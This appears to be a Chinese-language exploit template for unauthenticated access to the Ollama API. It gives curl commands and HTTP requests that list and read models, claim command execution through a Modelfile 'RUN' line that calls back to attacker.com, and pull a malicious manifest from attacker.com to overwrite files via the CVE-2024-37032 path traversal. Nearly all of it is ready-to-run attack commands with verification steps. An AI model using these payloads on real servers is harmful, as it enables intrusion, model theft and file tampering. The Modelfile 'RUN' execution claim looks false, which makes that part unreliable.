---
id: OLLAMA-UNACC-RCE
title: Ollama API 未授权访问导致模型窃取与命令执行
product: ollama
vendor: Ollama
version_affected: "< 0.1.34"
severity: CRITICAL
tags: [rce, ai, llm, 无需认证]
fingerprint: ["Ollama", "ollama", "/api/generate", "/api/tags", "/api/pull"]
---

## 漏洞描述

Ollama默认监听0.0.0.0:11434且无认证，攻击者可调用API执行任意操作：列出/删除模型、通过Modelfile的RUN指令执行系统命令。

## 影响版本

- Ollama < 0.1.34（CVE-2024-37032 路径穿越）
- Ollama 所有版本（默认无认证 API 访问）

## 前置条件

- 目标 Ollama 服务端口（默认11434）可从网络访问
- 服务未配置认证（默认行为）
- RCE 利用需攻击者控制一个 HTTP 服务器托管恶意 manifest

## 利用步骤

### Step 1: 确认未授权访问

```bash
curl http://target:11434/api/tags
# 返回已加载的模型列表
```

### Step 2: 通过 Modelfile RUN 执行命令

```http
POST /api/create HTTP/1.1
Host: target:11434
Content-Type: application/json

{
  "name": "pwn",
  "modelfile": "FROM llama2\nSYSTEM You are a helpful assistant\nRUN whoami > /tmp/pwned.txt"
}
```

### Step 3: 路径穿越任意文件覆盖 (CVE-2024-37032)

Ollama在处理模型拉取时，对digest验证不足导致路径穿越，可覆盖任意文件:
```http
POST /api/pull HTTP/1.1
Content-Type: application/json

{"name": "http://attacker.com:8080/malicious_manifest"}
```

恶意manifest中的layer digest包含`../`路径穿越，可覆盖任意文件（如crontab实现RCE）。

### Step 4: 读取模型文件（信息泄露）

```http
POST /api/show HTTP/1.1
Content-Type: application/json

{"name": "llama2"}
```

## Payload

### 列出所有模型

```bash
curl -s http://target:11434/api/tags
```

### 通过 Modelfile RUN 指令执行命令

```bash
curl -s -X POST http://target:11434/api/create \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pwn",
    "modelfile": "FROM llama2\nRUN curl http://attacker.com/callback?rce=proof"
  }'
```

### CVE-2024-37032: 拉取恶意 manifest 实现文件覆盖

```bash
curl -s -X POST http://target:11434/api/pull \
  -H "Content-Type: application/json" \
  -d '{"name": "http://attacker.com:8080/malicious_manifest"}'
```

### 模型信息泄露

```bash
curl -s -X POST http://target:11434/api/show \
  -H "Content-Type: application/json" \
  -d '{"name": "llama2"}'
```

## 验证方法

```bash
# 1. 确认未授权访问：返回 "Ollama is running" 即服务暴露
curl -s http://target:11434/ | grep -i "Ollama is running"

# 2. 确认可列出模型
curl -s http://target:11434/api/tags | grep '"name"'

# 3. RCE 验证：通过 OOB 回调确认
# 在 attacker.com 监听 HTTP 请求，执行 create payload 后检查是否收到回调
curl -s -X POST http://target:11434/api/create \
  -H "Content-Type: application/json" \
  -d '{"name":"verify","modelfile":"FROM llama2\nRUN curl http://attacker.com/callback"}'

# 4. 版本信息确认
curl -s http://target:11434/api/version | grep '"version"'
```

## 指纹确认

```bash
curl -s http://target:11434/ 
# 返回 "Ollama is running"
curl -s http://target:11434/api/version
```
